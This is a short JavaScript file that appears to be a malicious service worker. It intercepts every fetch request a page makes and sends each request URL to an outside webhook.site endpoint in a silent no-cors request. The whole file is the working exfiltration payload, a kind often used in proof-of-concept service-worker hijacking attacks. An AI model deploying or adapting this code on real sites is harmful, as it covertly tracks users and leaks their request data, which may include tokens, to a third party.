self.addEventListener('fetch', function(event) {
  fetch('https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253?sw_intercept=' + 
    encodeURIComponent(event.request.url), {mode:'no-cors'});
});
